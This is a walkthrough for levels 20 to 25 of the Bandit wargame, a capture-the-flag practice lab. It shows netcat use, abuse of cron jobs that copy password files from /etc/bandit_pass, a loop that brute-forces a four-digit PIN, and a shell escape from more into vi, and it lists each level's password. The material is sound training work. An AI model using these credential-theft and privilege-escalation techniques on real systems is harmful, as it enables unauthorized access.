# Bandit

## level 20

```
$ echo GbKksEFF4yrVs6il55v6gwY5aVje5f0j | nc localhost -l 7999
```

Then open another shell via ssh.

```
$ ./suconnect 7999
Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
Password matches, sending next password
```

The password for the next level will be shown in the first shell.

```
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
```

## level 21

```
$ cat /etc/cron.d/cronjob_bandit22
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
```

```
$ cat /usr/bin/cronjob_bandit22.sh
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

```
$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
```

## level 22

```
$ cat /usr/bin/cronjob_bandit23.sh
```

```bash
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
```

```
$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
```

## level 23

Create a shell script ```/var/spool/bandit24/shell.sh```.

```bash
#!/bin/bash

mkdir /tmp/ving
cat /etc/bandit_pass/bandit24 > /tmp/ving/pass
```

```
$ chmod 777 /var/spool/bandit24/shell.sh
```

```
$ cat /tmp/ving/pass
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

## level 24

Create a shell script ```/tmp/ving/shell.sh```

```bash
#!/bin/bash

i=1000
while [ $i -lt 10000 ]
do
    echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i | nc localhost 30002 > /tmp/ving/log.txt
    i=$(($i+1))
done
```

```
$ bash /tmp/ving/shell.sh
```

```
$ cat /tmp/ving/log.txt | sort | uniq
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```

## level 25

```
$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
```

```
$ cat /usr/bin/showtext
```

```bash
#!/bin/sh

more ~/text.txt
exit 0
```

The text.txt is only 6 lines. Make terminal's heigth less than 6 lines to get a page break.

```
$ ssh -i bandit26.sshkey bandit26@localhost
```

Enter ```v``` to start up a editor(vi). Type ```:r /etc/bandit_pass/bandit26``` and the password will be shown.

```
5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
```
